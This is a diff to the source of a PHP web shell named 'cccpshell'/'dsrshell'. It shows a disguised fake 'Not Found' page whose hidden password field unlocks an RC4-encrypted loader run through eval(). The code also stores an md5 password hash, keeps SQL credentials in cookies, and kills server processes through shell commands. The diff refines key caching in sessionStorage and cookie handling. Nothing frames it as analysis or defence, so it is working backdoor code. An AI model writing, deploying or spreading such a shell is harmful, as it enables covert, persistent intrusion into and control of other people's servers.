@@ -14,6 +14,7 @@ $config['hd_lines'] = 16; //lines in hex preview file
 $config['hd_rows'] = 32;  //16, 24 or 32 bytes in one line
 $config['FMLimit'] = False;    //file manager item limit. False = No limit
 $config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass) //cccpshell
+$config['cookieExp'] = 604800; //3600 * 24 * 7;
 $CCCPmod[] = 'sql';
 $CCCPtitle[] = tText('sql', 'SQL');
 $CCCPmod[] = 'connect';
@@ -657,6 +658,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	var onDrag = false;
 	var dragX, dragY, dragDeltaX, dragDeltaY, lastAjax , lastLoad = "";
 	var targeturl = "' . getSelf() . '";
+	var copyBuffer = []; 
 	
 	sorttable={k:function(a){sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,0==a.getElementsByTagName("thead").length&&(the=d.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);
 	if(1==a.tHead.rows.length){sortbottomrows=[];for(b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=d.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&
@@ -2279,9 +2281,6 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 		}
 	*/
 
-
-	$login = 604800; //3600 * 24 * 7;
-
 	if (isset($p['sqlcode'])){
 		$sBuff = '';
 		$con = sql_connect($p['sqltype'], $p['sqlhost'], $p['sqluser'], $p['sqlpass']);
@@ -2319,7 +2318,7 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 				$c_num = substr(md5(time() . rand(0, 100)), 0, 3);
 				while(isset($_COOKIE['c']) && is_array($_COOKIE['c']) && array_key_exists($c_num, $_COOKIE['c']))
 					$c_num = substr(md5(time() . rand(0, 100)), 0, 3);
-				setcookie('c[' . $c_num . ']', ((function_exists('json_encode') && function_exists('json_decode')) ? json_encode($p) : serialize($p)), time() + $login);
+				setcookie('c[' . $c_num . ']', ((function_exists('json_encode') && function_exists('json_decode')) ? json_encode($p) : serialize($p)), time() + $config['cookieExp']);
 			}
 			
 			$sBuff .= '<form>' .
@@ -2383,7 +2382,7 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 		if (isset($_COOKIE['c'])){
 			$delme = '';
 			if (isset($p['dc'])){
-				setcookie('c[' . $p['dc'] . ']', '', time() - $login);
+				setcookie('c[' . $p['dc'] . ']', '', time() - 1337);
 				$delme = $p['dc'];
 			}
 	
@@ -2740,14 +2739,17 @@ if (isset($p['me']) && $p['me'] === 'info'){
 
 if (isset($p['me']) && $p['me'] === 'process'){
 	if (isset($p['ps'])){
+		$tmp = '';
         for ($i = 0; count($p['ps']) > $i; $i++){
 			if (function_exists('posix_kill')) 
-				$sBuff .= sDialog((posix_kill($p['ps'][$i], '9') ? 'Process with pid ' . $p['ps'][$i] . ' has been successfully killed' : 'Unable to kill process with pid ' . $p['ps'][$i]));
+				$tmp .= (posix_kill($p['ps'][$i], '9') ? 'Process with pid ' . $p['ps'][$i] . ' has been successfully killed' : 'Unable to kill process with pid ' . $p['ps'][$i]) . '<br>';
 			else {
-				if($isWIN) $sBuff .= sDialog(execute('taskkill /F /PID ' . $p['ps'][$i]));
-				else $sBuff .= sDialog(execute('kill -9 ' . $p['ps'][$i]));
+				if($isWIN) $tmp .= execute("taskkill /F /PID {$p['ps'][$i]}") . '<br>';
+				else $tmp .= execute("kill -9 {$p['ps'][$i]}") . '<br>';
 			}
 		}
+		
+		$sBuff .= sDialog($tmp);
 	}
 
 	$h = 'ps aux';
@@ -2761,17 +2763,16 @@ if (isset($p['me']) && $p['me'] === 'process'){
 	if (trim($res) === '') $sBuff = sDialog('Error getting process list');
 	else {
 		if(!$isWIN) $res = preg_replace('#\ +#', ' ', $res);
-		$psarr = explode("
-", $res);
-		$fi = true;
+		$psarr = explode("\n", $res);
+		$h = true;
 		$tblcount = 0;
 		$wcount = count(explode($wexp, $psarr[0]));
 
-		$sBuff .= '<br><form method="post" action="" name="ps"><table class="explore sortable">';
+		$sBuff .= '<br><form><table id="sort" class="explore sortable">';
 		foreach($psarr as $psa){
 			if(trim($psa) !== ''){
-				if($fi){
-					$fi = false;
+				if($h){
+					$h = false;
 					$psln = explode($wexp, $psa, $wcount);
 					$sBuff .= '<tr><th style="width:24px;" class="sorttable_nosort"></th><th class="sorttable_nosort">action</th>';
 					foreach($psln as $p) $sBuff .= '<th>' . trim(trim($p), '"') . '</th>';
@@ -2784,8 +2785,9 @@ if (isset($p['me']) && $p['me'] === 'process'){
 						$pid = trim(trim($psln[1]), '"');
 						if(trim($p) === '') $p = '&nbsp;';
 						if($tblcount == 0){
-							$sBuff .= '<td style="text-align:center;text-indent:4px;"><input id="ps" name="ps[]" value="' . $pid . '" type="checkbox" onchange="hilite(this);" /></td><td style="text-align:center;"><a href="#" onclick="if (confirm(\'' . tText('merror', 'Are you sure?') . '\')) ajaxLoad(\'me=procs&ps[]=' . $pid . '\')">kill</a></td>
-									<td style="text-align:center;">' . trim(trim($p), '"') . '</td>';
+							$sBuff .= '<td style="text-align:center;text-indent:4px;"><input name="ps[]" value="' . $pid . '" type="checkbox" onchange="hilite(this);" /></td>' .
+								'<td style="text-align:center;"><a href="#" onclick="if (confirm(\'' . tText('merror', 'Are you sure?') . '\')) ajaxLoad(\'me=process&ps[]=' . $pid . '\')">kill</a></td>' .
+								'<td style="text-align:center;">' . trim(trim($p), '"') . '</td>';
 							$tblcount++;
 						} else {
 							$tblcount++;
@@ -2798,11 +2800,9 @@ if (isset($p['me']) && $p['me'] === 'process'){
 			}
 		}
 		
-		$sBuff .= '<tfoot><tr><td>
-		<input name="chkall" value="" type="checkbox" onclick="CheckAll(this.form);" />	
-		</td><td style="text-indent:10px;padding:2px;" colspan="' . (count($psln)+1) . '"><input name="submit" id="submit" type="submit" value="kill selected">
-		<span id="total_selected"></span></a></td>
-		</tr></tfoot></table></form>';
+		$sBuff .= '<tfoot><tr><td><input name="chkall" value="" type="checkbox" onclick="CheckAll(this.form);" /></td>' .
+			'<td style="text-indent:10px;padding:2px;" colspan="' . (count($psln)+1) . '">' . mSubmit(tText('ps0', 'kill selected'), 'ajaxLoad(serialize(d.forms[0]))') .
+			'<span id="total_selected"></span></a></td></tr></tfoot></table>' . mHide('me', 'process') . '</form>';
 	}
 }
 
@@ -3000,7 +3000,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	ajax = new XMLHttpRequest();
 	ajax.onreadystatechange = function() {
 		if (ajax.readyState == 4 && ajax.status == 200) {
-			hash = md5(d.getElementById('pss').value);
+			hash = sessionStorage.getItem('dsrshell');
 			d.getElementsByTagName('html')[0].innerHTML = rc4(atob(ajax.responseText), rc4Init(hash));
 			
 			oldscript = d.getElementsByTagName('head')[0].getElementsByTagName('script')[0];			
@@ -3012,23 +3012,34 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		}
 	}
 	
-	boxs = rc4Init(md5(d.getElementById('pss').value));
-	post = 'dsr=' + encodeURIComponent(btoa(rc4('me=loader', boxs)));
+	if (sessionStorage.getItem('dsrshell') != null) 
+		hash = sessionStorage.getItem('dsrshell');
+	else {
+		hash = md5(d.getElementById('pss').value);
+		sessionStorage.setItem('dsrshell', hash);
+	}
+	
+	post = 'dsr=' + encodeURIComponent(btoa(rc4('me=loader', rc4Init(hash))));
 	ajax.open('POST', '" . getSelf() . "', true);
 	ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 	ajax.setRequestHeader('Content-Length', post.length);
 	ajax.setRequestHeader('Connection', 'close');
-	ajax.send(post);";		
-	echo "function load(){
+	ajax.send(post);";
+		
+	echo "
+	function load(hash){
 		loader = '" . base64_encode(rc4($loader, rc4Init($config['sPass']))) . "';
-		boxs = rc4Init(md5(document.getElementById('pss').value));
+		boxs = rc4Init(hash);
 		eval(rc4(atob(loader), boxs));			
-	}"; ?>
+	}
+	
+	if (sessionStorage.getItem('dsrshell') != null) load(sessionStorage.getItem('dsrshell'));
+	"; ?>
 </script>
 </head><body>
 <h1>Not Found</h1>
 <p>The requested URL <?php echo $_SERVER['HTTP_HOST']; ?> was not found on this server.</p>
 </body>
 <style>input{ margin:0;background-color:#fff;border:1px solid #fff; }</style>
-<center><form onsubmit="load();return false;"><input type="password" id="pss"></form>
+<center><form onsubmit="load(md5(document.getElementById('pss').value));return false;"><input type="password" id="pss"></form>
 </html>
